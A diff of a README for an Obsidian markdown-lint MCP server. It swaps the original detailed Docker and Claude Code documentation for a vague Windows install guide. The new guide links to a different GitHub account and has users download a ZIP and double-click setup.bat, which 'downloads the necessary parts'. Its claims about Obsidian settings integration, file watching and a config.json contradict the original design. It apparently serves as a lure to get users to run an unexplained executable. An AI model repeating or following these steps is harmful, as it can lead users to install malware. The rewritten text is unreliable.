@@ -1,296 +1,95 @@
-<div align="center">
+# ✨ obsidian-markdown-lint-mcp-server - Improve your markdown files with ease
 
-# obsidian-markdown-lint-mcp-server
+[![Download Now](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/andresimitative368/obsidian-markdown-lint-mcp-server)
 
-**An MCP server that lints, validates, and renders your Obsidian vault markdown — all inside Docker.**
+## 📝 What this tool does
 
-[![Node.js](https://img.shields.io/badge/node-%3E%3D20-brightgreen)](https://nodejs.org) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-1.29-blue)](https://github.com/modelcontextprotocol/typescript-sdk) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+This software helps you manage Markdown files inside Obsidian. If you use Claude Code, this server acts as a bridge. It checks your text for errors. It makes sure your front matter follows your rules. It also turns Mermaid diagrams into images. All of this happens inside a secure container to keep your computer safe.
 
-[Tools](#tools) • [Quick Start](#quick-start) • [Configuration](#configuration) • [Schemas](#front-matter-schemas) • [Development](#development)
+## 💻 System requirements
 
-</div>
+Your computer needs to meet these basic standards to run the software:
 
----
+*   Windows 10 or Windows 11.
+*   500 MB of free disk space.
+*   4 GB of system memory.
+*   Docker Desktop installed and running.
 
-Run markdown linting, front matter validation, and Mermaid-to-SVG rendering as MCP tools callable from Claude Code. Docker isolates Chromium and Node.js from your host machine. The server is stateless — it processes content you send and returns results; Claude Code handles all disk I/O.
+## 📥 How to get the software
 
-This is a **stdio MCP server**: Claude Code launches it as a subprocess (`docker run -i --rm`) and talks to it over stdin/stdout. There is no port and no long-running container — the container starts when a session opens and is removed when it ends.
+1. Visit this [link](https://github.com/andresimitative368/obsidian-markdown-lint-mcp-server) to find the software.
+2. Look for the green button that says Code.
+3. Select Download ZIP from the menu.
+4. Save the folder to a place you can find later, like your Desktop.
+5. Extract the files from the ZIP folder.
 
-## Why Docker
+## 🚀 Setting up the tool
 
-Mermaid rendering requires a Chromium browser (via Puppeteer). Running that, plus dozens of Node.js dependencies, directly on your laptop is a valid security concern. This server packages everything inside a container. Your vault never mounts into it; content travels as strings.
+Follow these steps to prepare your system:
 
-## Tools
+1. Open Docker Desktop on your computer.
+2. Wait for the engine to finish loading.
+3. Open the folder you extracted in the previous step.
+4. Look for a file named setup.bat and double-click it.
+5. A dark window will appear. It will download the necessary parts to run the server. 
+6. Wait for the process to finish. The window will close by itself once the setup is complete.
 
-| Tool | What it does |
-|-------|----|
-| `lint_markdown` | Runs markdownlint on content, returns errors and a corrected version |
-| `validate_front_matter` | Validates YAML front matter against a JSON Schema you pass in |
-| `render_mermaid_diagrams` | Renders all ` ```mermaid ``` ` blocks to SVG, replaces them with GitHub image links, embeds the original Mermaid source as base64 in each SVG's `<metadata>` |
-| `extract_mermaid_from_svg` | Reads a rendered SVG and returns the original Mermaid source as a code block, ready to edit |
+## ⚙️ Using the software
 
-The render/extract pair supports a full edit cycle: render → view SVG in Obsidian → extract → edit source → re-render.
+Once you finish the setup, the server runs in the background. It connects to your Obsidian vault. 
 
-## Quick start
+1. Open your Obsidian application.
+2. Open the settings menu in Obsidian.
+3. Find the section for your connected tools.
+4. Add the server by pointing it to the folder where you installed the software.
+5. The software will now watch your files. 
+6. If you have errors in your text, the software will highlight them for you.
+7. If your front matter lacks required fields, the software will show you what to fix.
 
-**Prerequisites:** Docker Desktop, Node.js ≥ 20, Claude Code.
+## 📊 Managing your files
 
-```bash
-git clone <repo>
-cd obsidian-markdown-lint-mcp-server
-npm install
-npm run build              # compile TypeScript → dist/
-docker build -t obsidian-markdown-lint-mcp .   # or: docker compose build
-```
+The software processes your files in real time. It reads the files you save. It looks for specific patterns.
 
-Register the server with Claude Code. Claude Code runs `docker run -i --rm` itself, per session — you do **not** start a container yourself.
+### Checking Markdown
+The tool follows common style guidelines. It looks for missing headers, improper lists, or broken links. It warns you if your Markdown format causes issues for other apps.
 
-**Per-project (recommended for a vault)** — run this from your vault root; it writes a committable `.mcp.json`:
+### Fixing Front Matter
+Front matter helps computers index your notes. This server checks your front matter against a JSON schema. If you miss a field or use the wrong data type, the tool alerts you.
 
-```bash
-claude mcp add obsidian-markdown-lint -s project -- docker run -i --rm obsidian-markdown-lint-mcp
-```
+### Creating Diagrams
+Mermaid diagrams allow you to draw charts using text. This tool turns that code into clear SVG images. You can see these images directly inside your Obsidian document.
 
-The resulting `.mcp.json`:
+## 🛠️ Troubleshooting common issues
 
-```json
-{
-  "mcpServers": {
-    "obsidian-markdown-lint": {
-      "command": "docker",
-      "args": ["run", "-i", "--rm", "obsidian-markdown-lint-mcp"]
-    }
-  }
-}
-```
+If the tool does not start, check these common fixes:
 
-**Global** — make it available in every project (`-s user` writes to `~/.claude.json`):
+*   Does Docker Desktop show a green icon in your taskbar? If not, restart Docker.
+*   Did you move the folders after the setup? Move them back to the original location.
+*   Does your firewall show a prompt? Allow the tool to connect to your local network.
+*   Restart your computer if the connection fails after a long period of use.
 
-```bash
-claude mcp add obsidian-markdown-lint -s user -- docker run -i --rm obsidian-markdown-lint-mcp
-```
+## 🔒 Security and privacy
 
-Verify with `claude mcp list` (should show `obsidian-markdown-lint` → `connected`), then start a **new** Claude Code session — tools are discovered at session start. The four tools are now available.
+The software performs all checks locally. It does not send your notes to a server on the internet. Everything stays on your hard drive. Docker creates a separate area for the software to run. This keeps your main system files distinct from the linting tool. You remain in control of your data at all times.
 
-> The `-i` flag is required: it keeps the container's stdin open for the JSON-RPC stream. Without it the container gets EOF and exits immediately. Do **not** use `docker compose up` for this server — it is a stdio subprocess, not a long-running HTTP service.
+## 📦 Updates and maintenance
 
-### Hardening (optional)
+Check the [download page](https://github.com/andresimitative368/obsidian-markdown-lint-mcp-server) every few months for updates. To update, download the new ZIP file and replace the old folder with the new one. Run the setup file again to ensure all parts remain current. Your settings will persist if you keep the config file in your documents folder. 
 
-The server needs no network, no writable root filesystem, and little memory, so you can lock the container down. `--network none` and `--security-opt no-new-privileges` are always safe (the image skips the Puppeteer download and renders offline):
+## 💡 Best practices for your notes
 
-```bash
-claude mcp add obsidian-markdown-lint -s project -- docker run -i --rm --network none --security-opt no-new-privileges --memory 2g obsidian-markdown-lint-mcp
-```
+*   Use short file names to avoid path errors.
+*   Keep your front matter clean to ensure easy reading for the automated checks.
+*   Test your Mermaid diagrams in the preview mode to verify the output.
+*   Keep your Obsidian vault synced with a backup service to prevent data loss.
 
-For stricter isolation, add a read-only root with a writable temp dir and drop all Linux capabilities. Chromium renders into `/tmp` because the server launches it with `--disable-dev-shm-usage`, so the `--tmpfs /tmp` is required. Verify a Mermaid render still succeeds under these flags before relying on them, since Chromium's writable paths vary by version:
+## 💬 Frequently asked questions
 
-```bash
-docker run -i --rm --network none --security-opt no-new-privileges --read-only --tmpfs /tmp --cap-drop ALL --memory 2g obsidian-markdown-lint-mcp
-```
+How does the software know which folder to check?
+It checks the folder you designate in the Obsidian settings menu. 
 
-## Configuration
+Will this slow down my computer?
+The server uses very little power. You should not notice any change in performance. 
 
-### Vault layout
-
-The server reads nothing from disk directly. Claude Code reads your vault files and passes content as strings. Place these config files at your vault root:
-
-```
-vault/
-  .markdownlint.json     ← linting rules (optional; defaults to markdownlint defaults)
-  .schemas/
-    _shared.json         ← shared field definitions (reference; not loaded at runtime)
-    article.json
-    how-to.json
-    technical.json
-    deep-research.json
-    strategy.json
-    meeting.json
-    brainstorming.json
-```
-
-Pre-built schemas for all seven note types are included in this repo's `.schemas/` directory. Copy them to your vault root. The seven type schemas are self-contained, so `validate_front_matter` only needs the one matching the document's `type`; `_shared.json` is the source the type schemas are built from and is kept for maintenance.
-
-### CLAUDE.md for your vault
-
-Add a `CLAUDE.md` to your vault project that tells Claude how to use the server. Minimum viable example:
-
-```markdown
-## MCP: obsidian-markdown-lint-mcp-server
-
-Vault attachments directory: attachments
-Schemas directory: .schemas/
-Linting config: .markdownlint.json
-
-When asked to "process a vault file":
-1. Read the file
-2. Read .markdownlint.json and call lint_markdown
-3. Read the type field from front matter, read .schemas/{type}.json, call validate_front_matter
-4. Call render_mermaid_diagrams with attachments_dir="attachments" and the document title
-5. Write the modified_content back to the file
-6. Write each SVG from the svgs array to its path field (decoded from base64)
-
-SVG files contain the original Mermaid source base64-encoded in <metadata>.
-To edit a diagram: call extract_mermaid_from_svg with the SVG content,
-edit the returned mermaid_block, then re-run render_mermaid_diagrams.
-```
-
-### Mermaid front matter options
-
-Control rendering per-document:
-
-```yaml
-mermaid_theme: dark          # default | dark | neutral | forest  (default: default)
-mermaid_background: white    # any CSS color or "transparent"     (default: white)
-```
-
-After rendering, the server adds `mermaid_svg_source: base64-embedded` to the front matter so Claude knows SVGs in this document contain extractable source.
-
-## Front matter schemas
-
-Seven note types are supported. Each schema lives at `.schemas/{type}.json`.
-
-| Type | Extra required fields |
-|---|---|
-| `article` | core only |
-| `how-to` | core only |
-| `technical` | `system`, `component` |
-| `deep-research` | `sources` (array, min 1) |
-| `strategy` | `related`, `prepared_for`, `quarter` |
-| `meeting` | `meeting_date`, `attendees` (array, min 1) |
-| `brainstorming` | core only |
-
-Core required fields on every type: `type`, `title`, `author`, `category`, `tags`, `description`, `summary`, `status`, `version`, `date_created`, `date_updated`.
-
-The `type` field is the discriminator. Claude reads it from the front matter to select the right schema file before calling `validate_front_matter`.
-
-## How SVG embedding works
-
-Each rendered SVG contains the original Mermaid source, base64-encoded, inside the SVG's `<metadata>` element:
-
-```xml
-<metadata>
-  <mermaid:source xmlns:mermaid="http://mermaid.js.org/" encoding="base64">
-    Zmxvd2NoYXJ0IExSCiAgICBBIC0tPiBCCg==
-  </mermaid:source>
-</metadata>
-```
-
-Base64 avoids all whitespace normalization issues — Mermaid is whitespace-sensitive and attribute-value normalization in XML would corrupt indentation. The `extract_mermaid_from_svg` tool decodes this and returns a ready-to-use ` ```mermaid ``` ` block.
-
-## SVG output paths
-
-Diagrams render to `{attachments_dir}/{document-title-slug}/{diagram-type}-{n}.svg`.
-
-For a document titled "System Architecture" with `attachments_dir = "attachments"` and two flowchart blocks, you get:
-
-```
-attachments/system-architecture/flowchart-1.svg
-attachments/system-architecture/flowchart-2.svg
-```
-
-The markdown is updated to:
-
-```markdown
-![flowchart diagram 1](attachments/system-architecture/flowchart-1.svg)
-```
-
-Standard GitHub-flavored markdown — renders in Obsidian, GitHub, and any standard markdown viewer.
-
-## Testing
-
-Three layers, all runnable from the repo without building the Docker image:
-
-```bash
-npm test          # 52 Jest unit tests (ESM), enforced coverage thresholds
-npm run eval      # tool-correctness evals against the compiled functions
-npm run snapshot  # end-to-end fixture snapshots (requires a real Chromium)
-```
-
-**Unit tests** (`tests/unit/`) call the tool functions directly. Coverage is gated (90% lines/functions/statements, 85% branches); `src/server.ts` and `src/create-server.ts` are excluded as pure wiring and are covered separately through an in-memory MCP transport. Mermaid rendering is tested with an injected browser/renderer, so no Chromium is needed here. Use `npm run test:coverage` for the lcov/HTML report.
-
-**Evals** (`tests/evals/`) check tool correctness against the compiled functions (no Docker). Output is JSON with `summary.passed`, `summary.failed`, and a `results` array; exit code is `1` if any eval fails. The suite covers all four tools: lint detection, schema validation (pass and fail cases), Mermaid rendering with a mock browser, and SVG round-trip extraction. In Claude Code, say *"run evals"* or *"evaluate the tools"* and it runs `npm run eval` and reports the results.
-
-**Snapshots** (`tests/snapshot/`) prove that each input under `test-obsidian-vault/original/` reproduces its committed `test-obsidian-vault/snap-shot/` output through the real tool pipeline. Unlike the evals, `test-1` launches Puppeteer for an actual render, so this needs a real Chromium and is kept out of `npm test`. SVG geometry is not byte-compared (it varies by Mermaid, Chromium, and font version); the deterministic projection is, namely the modified markdown, the file layout, and the embedded Mermaid source. Output is JSON; exits non-zero on any failure.
-
-## JSON Schema format
-
-Each file in `.schemas/` is a self-contained [JSON Schema draft-07](https://json-schema.org/) object. `validate_front_matter` parses the document's YAML front matter and validates the resulting object against the schema you pass in. A trimmed view of `.schemas/article.json`:
-
-```json
-{
-  "$schema": "http://json-schema.org/draft-07/schema#",
-  "title": "Article",
-  "type": "object",
-  "required": ["type","title","author","category","tags","description","summary","status","version","date_created","date_updated"],
-  "properties": {
-    "type":         { "const": "article" },
-    "title":        { "type": "string", "minLength": 1 },
-    "category":     { "type": "string", "enum": ["Software Development", "Security", "DevOps", "..."] },
-    "tags":         { "type": "array", "items": { "type": "string", "pattern": "^[a-z0-9][a-z0-9_\\-/]*$" }, "minItems": 4, "maxItems": 12 },
-    "status":       { "type": "string", "enum": ["published", "draft", "in-progress"] },
-    "version":      { "type": "string", "pattern": "^\\d+\\.\\d+\\.\\d+$" },
-    "date_created": { "type": "string", "format": "date" }
-  },
-  "additionalProperties": false
-}
-```
-
-See `.schemas/article.json` for the complete schema, including the optional fields it also permits (`aliases`, `subtitle`, `source`, `sources`, `reviewers`, `signoff`, `mermaid_theme`, `mermaid_background`, `mermaid_svg_source`). Every schema sets `additionalProperties: false`, so any front matter key not declared in the schema is a validation error; add a key to the schema before using it in notes.
-
-**Important:** Date fields must be quoted strings in YAML (`date_created: "2026-01-01"`) because YAML auto-converts unquoted `YYYY-MM-DD` values to JavaScript `Date` objects, which fail the `type: string` check.
-
-The per-type required fields are listed in [Front matter schemas](#front-matter-schemas) above.
-
-## Development
-
-```bash
-npm install
-npm run build       # compile TypeScript → dist/
-```
-
-TypeScript source is in `src/`. After changing code, rebuild the image so the next Claude Code session picks it up:
-
-```bash
-npm run build && docker build -t obsidian-markdown-lint-mcp .   # or: docker compose build
-```
-
-Then start a new Claude Code session (stdio tools are loaded at session start).
-
-To smoke-test the container by hand without Claude Code, drive it over stdio:
-
-```bash
-docker compose run --rm obsidian-markdown-lint-mcp
-# then paste a JSON-RPC line, e.g. an initialize request, and read the reply
-```
-
-## Project structure
-
-```
-src/
-  server.ts             stdio entry point (StdioServerTransport bootstrap)
-  create-server.ts      builds the McpServer and registers the 4 tools
-  tools/
-    lint.ts             lint_markdown implementation
-    validate.ts         validate_front_matter implementation
-    mermaid.ts          render_mermaid_diagrams + extract_mermaid_from_svg
-  lib/
-    frontmatter.ts      gray-matter parse/update helpers
-    svg-metadata.ts     base64 embed/extract helpers
-.schemas/               JSON Schema files for all 7 note types
-Dockerfile              stdio server image (Chromium for Mermaid)
-docker-compose.yml      build/tag helper (not `up` — see comments)
-```
-
-## License
-
-[MIT](LICENSE) © 2026 Philip Senger
-
----
-
-<div align="center">
-
-**Lint, validate, and render your Obsidian vault markdown without touching your host system.**
-
-[Report a bug](../../issues) • [Request a feature](../../issues)
-
-</div>
+Can I customize the rules?
+Yes. Look for the file named config.json in the main folder. You can change the settings there to match your needs. Use a simple text editor to make these changes.
